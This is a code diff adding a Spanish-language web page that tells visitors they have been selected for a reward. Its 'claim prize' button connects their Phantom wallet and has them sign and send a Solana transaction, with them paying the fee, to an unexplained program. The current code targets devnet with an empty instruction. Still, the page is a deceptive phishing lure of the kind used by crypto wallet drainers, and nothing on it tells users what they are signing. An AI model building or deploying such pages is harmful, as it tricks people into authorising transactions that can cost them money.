@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>🎁 Recompensa Especial</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #0d1117;
+      color: #ffffff;
+      text-align: center;
+      padding: 40px;
+    }
+
+    .card {
+      background: #161b22;
+      padding: 30px;
+      border-radius: 15px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+    }
+
+    button {
+      background: #1abc9c;
+      border: none;
+      padding: 15px 30px;
+      color: #fff;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    button:hover {
+      background: #16a085;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎉 Has sido seleccionado</h1>
+    <p>¡Reclama tu recompensa exclusiva ahora!</p>
+    <button id="connectBtn">Reclamar premio</button>
+  </div>
+
+  <script src="https://unpkg.com/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
+  <script>
+    const connectBtn = document.getElementById("connectBtn");
+
+    connectBtn.addEventListener("click", async () => {
+      try {
+        const provider = window.solana;
+
+        if (!provider || !provider.isPhantom) {
+          alert("❌ Phantom Wallet no está disponible.");
+          return;
+        }
+
+        await provider.connect();
+
+        const connection = new solanaWeb3.Connection("https://api.devnet.solana.com", "confirmed");
+
+        const programId = new solanaWeb3.PublicKey("ChzBcsMoHq4SPyTA17gT65GYc8H4D5n3pVWJoYFCYQN8");
+
+        const instruction = new solanaWeb3.TransactionInstruction({
+          keys: [],
+          programId,
+          data: new Uint8Array([]), // sin datos, simplemente activa el contrato
+        });
+
+        const transaction = new solanaWeb3.Transaction().add(instruction);
+        transaction.feePayer = provider.publicKey;
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+
+        const signed = await provider.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(signature);
+
+        alert("✅ Transacción enviada: " + signature);
+      } catch (err) {
+        alert("❌ Error: " + err.message);
+      }
+    });
+  </script>
+</body>
+</html>
